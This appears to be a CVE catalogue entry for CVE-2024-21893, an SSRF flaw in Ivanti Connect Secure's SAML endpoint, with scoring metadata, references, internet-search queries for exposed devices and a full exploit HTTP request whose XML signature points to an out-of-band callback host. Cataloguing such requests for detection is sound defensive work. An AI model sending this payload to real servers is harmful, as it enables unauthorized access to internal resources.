_cves/2024/cve-2024-21893.md

---
layout: "post"
cve_id: "CVE-2024-21893"
title: "Ivanti SAML - Server Side Request Forgery (SSRF)"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-21893.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-21893.yaml"
author: "DhiyaneshDk"
severity: "high"
reference:
  - "https://attackerkb.com/topics/FGlK1TVnB2/cve-2024-21893/rapid7-analysis"
  - "https://www.assetnote.io/resources/research/ivantis-pulse-connect-secure-auth-bypass-round-two"
  - "https://github.com/advisories/GHSA-5rr9-mqhj-7cr2"
  - "https://github.com/Chocapikk/CVE-2024-21893-to-CVE-2024-21887"
  - "https://github.com/Ostorlab/KEV"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
  cvss-score: 8.2
  cve-id: "CVE-2024-21893"
  cwe-id: "CWE-918"
  epss-score: 0.9432
  epss-percentile: 0.99945
  cpe: "cpe:2.3:a:ivanti:connect_secure:9.0:-:*:*:*:*:*:*"
metadata:
  max-request: 1
  vendor: "ivanti"
  product: "connect_secure"
  shodan-query: ['html:"welcome.cgi?p=logo"', 'http.title:"ivanti connect secure"', 'http.html:"welcome.cgi?p=logo"']
  fofa-query: ['body="welcome.cgi?p=logo"', 'title="ivanti connect secure"']
  google-query: "intitle:\"ivanti connect secure\""
tags:
  - "cve"
  - "cve2024"
  - "kev"
  - "ssrf"
  - "ivanti"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## 🔍 Vulnerability Description
A server-side request forgery vulnerability in the SAML component of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) and Ivanti Neurons for ZTA allows an attacker to access certain restricted resources without authentication.


## 🌐 HTTP Request
```nohighlight
POST /dana-ws/saml20.ws HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1
Connection: close
Content-Length: 788
Accept-Encoding: gzip

<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">	<soap:Body>		<ds:Signature		xmlns:ds="http://www.w3.org/2000/09/xmldsig#">			<ds:SignedInfo>				<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>				<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>			</ds:SignedInfo>			<ds:SignatureValue>qwerty</ds:SignatureValue>			<ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">				<ds:RetrievalMethod URI="http://d4t7ql9le0o4ss5lgv4gx5tmd78xzpaf6.oast.me"/>				<ds:X509Data/>			</ds:KeyInfo>			<ds:Object></ds:Object>		</ds:Signature>	</soap:Body></soap:Envelope>
```


